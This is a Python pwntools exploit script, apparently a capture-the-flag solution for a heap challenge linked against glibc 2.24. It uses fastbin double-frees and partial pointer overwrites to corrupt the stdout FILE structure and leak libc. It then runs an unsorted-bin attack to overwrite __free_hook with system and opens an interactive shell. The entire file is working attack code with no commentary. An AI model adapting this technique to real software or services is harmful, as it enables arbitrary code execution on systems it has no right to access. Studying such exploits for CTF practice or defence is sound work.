#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.24.so")
ld = ELF("./ld-2.24.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 1337)

    return r

r = conn()

def add(sz, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(sz).encode())
    r.sendafter(b"Data?\n", data)

def free(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode())

def main():

    
    add(0x67, b"A" * 0x67)
    add(0x67, p64(0) * 5 + p64(0x71))
    add(0x67, p64(0) * 5 + p64(0x41) + p64(0) * 6 + p64(0x70)[:7])
    add(0x10, b"D" * 0x10)
    add(0x10, b"D" * 0x10)
    add(0x67, b"A" * 0x67)
    add(0x67, b"A" * 0x67)

    

    free(0)
    free(1)
    free(0)

    add(0x67, b"\xa0")
    add(0x67, b"x" * 16)
    add(0x67, b"x" * 16)

    fake_chunk = p64(0) * 7 + p64(0x91)
    add(0x67, fake_chunk)
    free(2)
    free(10)

    fake_chunk = p64(0) * 7 + p64(0x71) + b"\xbd\x25"
    add(0x67, fake_chunk)

    free(5)
    free(0)
    free(5)
    add(0x60, b"\xe0")

    free(11)
    add(0x10, b"\x00")
    add(0x40, b"A" * 8)

    fake_chunk = p64(0) * 7 + p64(0x71)
    add(0x67, fake_chunk + b"\xbd\x25")
    

    add(0x67, b"\xbd")
    add(0x67, b"\xbd")
    add(0x67, b"\xbd")

    
    fake_overwrite = b"\x00" * 0x33 + p64(0x00000000fbad2087 + 0x1800) + p64(0) * 3 + b"\x00"
    add(0x67, fake_overwrite)

    leak = r.recv(0x20)
    leak = r.recv(8)
    leak = u64(leak)
    log.info("Leak: " + hex(leak))
    libc.address = leak - 0x3c2600
    log.info("Libc: " + hex(libc.address))

    free(5)
    free(0)
    free(5)

    one_gadget = 0x4557a

    add(0x67, p64(libc.symbols["__free_hook"] - 0x33))
    add(0x67, b"/bin/sh\x00")
    add(0x67, b"i" * 8)
    #add(0x67, b"i" * 19 + p64(libc.address + one_gadget))

    # part 2: unsorted bin attack
    add(0x47, p64(0) * 5 + p64(0x51))
    add(0x47, p64(0) * 5 + p64(0x21) + p64(0) * 2 + p64(0x50)[:7])
    add(0x47, b"c" * 0x47)
    add(0x10, b"d" * 0x10)

    free(23)
    free(24)
    free(23)

    add(0x47, b"\xa0")
    add(0x47, b"x" * 16)
    add(0x47, b"x" * 16)

    fake_chunk = p64(0) * 3 + p64(0xa1)
    add(0x47, fake_chunk)
    free(30)
    free(28)

    fake_chunk = p64(0) * 3 + p64(0x51) + b"A" * 8 + p64(libc.sym['__free_hook'] - 0x40)
    add(0x47, fake_chunk)
    add(0x47, b"\x00")
    
    add(0x67, b"i" * 3 + p64(0) * 4 + p64(libc.sym['system']))
    free(0)

    r.interactive()

    


if __name__ == "__main__":
    main()
